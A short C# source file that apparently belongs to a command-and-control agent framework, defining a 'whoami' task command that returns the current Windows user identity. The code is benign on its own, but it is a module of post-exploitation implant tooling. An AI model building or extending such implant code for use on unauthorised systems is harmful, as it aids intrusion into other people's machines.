using Knight.Models.Raven;
using System.Security.Principal;

namespace Knight.Commands
{
    public class WhoAmI : KnightCommand
    {
        public override string Name => "whoami";

        public override string Execute(TaskMessage task)
        {
            // could use Environment variable (but may have been changed)

            var identity = WindowsIdentity.GetCurrent();
            return identity.Name;
        }
    }
}